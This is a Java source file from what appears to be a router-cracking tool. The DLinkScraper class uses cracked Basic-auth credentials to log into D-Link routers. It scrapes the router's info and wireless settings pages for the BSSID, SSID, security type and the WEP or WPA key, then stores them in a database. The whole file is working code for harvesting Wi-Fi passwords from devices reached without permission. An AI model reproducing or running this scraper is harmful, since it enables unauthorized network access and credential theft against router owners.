/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package org.koreops.tauro.cli.scraper.basicauth;

import org.jsoup.HttpStatusException;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.koreops.net.def.beans.AuthCrackParams;
import org.koreops.tauro.cli.authtrial.threads.DefaultAuthTrial;
import org.koreops.tauro.cli.dao.UpdaterDao;
import org.koreops.tauro.cli.scraper.AbstractScraper;
import org.koreops.tauro.core.exceptions.DbDriverException;
import org.koreops.tauro.core.loggers.Logger;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.logging.Level;

/**
 * Scraper module for D-Link Routers.
 *
 * @author Sudipto Sarkar (k0r0pt) (sudiptosarkar@visioplanet.org).
 */
public class DLinkScraper extends AbstractScraper {

  public DLinkScraper(String host, String hostUrl, AuthCrackParams params) {
    super(host, hostUrl, params);
  }

  @Override
  public boolean scrapeAndLog() throws DbDriverException {
    return this.logDLinkWirelessStation(hostUrl, base64Login);
  }

  private boolean logDLinkWirelessStation(String hostUrl, String base64Login) throws DbDriverException {
    try {
      String macAddr = null;
      String devInfoUrl = hostUrl + "info.html";

      Document doc = Jsoup.connect(devInfoUrl).userAgent(USER_AGENT).header("Authorization", "Basic " + base64Login).timeout(60000).get();

      Elements data = doc.select("tbody");

      for (Element datum : data) {
        if ("Wireless LAN".equalsIgnoreCase(datum.select("tr td.topheader").text())) {
          Logger.info("Found Wireless LAN header.", true);
          for (Element row : datum.select("tr:eq(1) td.content table.formarea tbody tr")) {
            Logger.info(row.select("td.form_label").text() + " " + row.select("td:eq(1)").text(), true);
            if (row.select("td.form_label").text().startsWith("MAC Address")) {
              macAddr = row.select("td:eq(1)").text();
            }
          }
        }
      }

      if (macAddr == null) {
        Logger.error(host + ": does not have Wireless (not on the modem at least).");
        return true; // If there's info.html, it's no other modem.
      }

      Logger.debug(host + ": Found MAC: " + macAddr);

      Map<String, String> wifiData = getDLinkWirelessData(hostUrl, base64Login);
      if (wifiData == null) {
        return false;
      }
      wifiData.put("BSSID", macAddr.toLowerCase());

      UpdaterDao.saveStation(wifiData, host);
      return true;
    } catch (HttpStatusException ex) {
      if ((ex.getStatusCode() != 404) && (ex.getStatusCode() != 501)) {
        Logger.error(host + ": HttpStatusException during logWirelessStation() " + ex.getMessage() + " ::::::: " + ex.toString());
      }
    } catch (IOException ex) {
      Logger.error(host + ": IOException during logWirelessStation(): " + ex.getMessage() + " ::::::: " + ex.getLocalizedMessage());
      java.util.logging.Logger.getLogger(DefaultAuthTrial.class.getName()).log(Level.SEVERE, null, ex);
    } catch (DbDriverException ex) {
      throw ex;
    } catch (Exception ex) {
      Logger.error(host + ": Exception during logWirelessStation(): " + ex.getMessage() + " ::::::: " + ex.getLocalizedMessage());
      java.util.logging.Logger.getLogger(DefaultAuthTrial.class.getName()).log(Level.SEVERE, null, ex);
    }
    return false;
  }

  /**
   * This is for the DLink modems (mostly on BSNL connections).
   * <b>Matching url</b>: <i>wirelesssetting.html</i>
   *
   * @return All Wireless data in Map.
   */
  private Map<String, String> getDLinkWirelessData(String hostUrl, String base64Login) {
    Map<String, String> wifiData = null;
    boolean wifiActivated = false;
    try {
      String wifiInfoUrl = hostUrl + "wirelesssetting.html";
      Document doc = Jsoup.connect(wifiInfoUrl).userAgent(USER_AGENT).header("Authorization", "Basic " + base64Login).timeout(60000).get();

      Elements elements = doc.select("input[name=Wlan_cbEnableFlag]");

      for (Element element : elements) {
        if (element.attr("value").equalsIgnoreCase("1")) {
          wifiActivated = true;
        }
      }

      if (!wifiActivated) {
        return null;
      }

      // Wifi is Activated. Let's do this!
      wifiData = new HashMap<>();
      for (Element element : doc.select("input[name=Wlan_Ssid]")) {
        if (!wifiData.containsKey("SSID")) {
          wifiData.put("SSID", element.attr("value"));
          Logger.info(host + ": Found SSID: " + wifiData.get("SSID"));
        } else {
          Logger.error(host + ": Has multiple SSIDs. Modify program to handle this.");
        }
      }

      for (Element element : doc.select("select[name=Wlan_slSecType]")) {
        for (Element option : element.select("option")) {
          if (option.hasAttr("selected")) {
            wifiData.put("AuthType", option.text());
            Logger.info(host + ": Found AuthType: " + wifiData.get("AuthType"));
          }
        }
      }

      boolean wep = false;

      for (Element element : doc.select("select[name=WlanWpa_slMode]")) {
        for (Element option : element.select("option")) {
          if (option.hasAttr("selected")) {
            wifiData.put("Encryption", option.text());
            Logger.info(host + ": Found Encryption: " + wifiData.get("Encryption"));
            break;
          }
        }
      }

      if (!wifiData.containsKey("Encryption")) {
        for (Element element : doc.select("select[name=WlanWep_slKeyLen]")) {
          for (Element option : element.select("option")) {
            if (option.hasAttr("selected")) {
              wifiData.put("Encryption", option.text());
              Logger.info(host + ": Found Encryption: " + wifiData.get("Encryption"));
              wep = true;
              break;
            }
          }
        }
      }

      if (wep) {
        String keyNum = null;
        for (Element element : doc.select("select[name=WlanWep_slDefKey]")) {
          for (Element option : element.select("option")) {
            if (option.hasAttr("selected")) {
              keyNum = Character.toString(option.text().charAt(option.text().length() - 1));
              break;
            }
          }
        }

        for (Element element : doc.select("input[name=WlanWep_Key".concat(keyNum).concat("]"))) {
          wifiData.put("key", element.attr("value"));
          Logger.info(host + ": Found key: " + wifiData.get("key"));
        }
      } else {
        for (Element element : doc.select("input[name=WlanWpa_SharedKey]")) {
          wifiData.put("key", element.attr("value"));
          Logger.info(host + ": Found key: " + wifiData.get("key"));
        }
      }
    } catch (HttpStatusException ex) {
      Logger.error(host + ": HttpStatusException during getWirelessData() " + ex.getMessage() + " ::::::: " + ex.toString());
    } catch (IOException ex) {
      Logger.error(host + ": IOException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
      java.util.logging.Logger.getLogger(DefaultAuthTrial.class.getName()).log(Level.SEVERE, null, ex);
    } catch (Exception ex) {
      Logger.error(host + ": Exception during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
      java.util.logging.Logger.getLogger(DefaultAuthTrial.class.getName()).log(Level.SEVERE, null, ex);
    }
    return wifiData;
  }

}
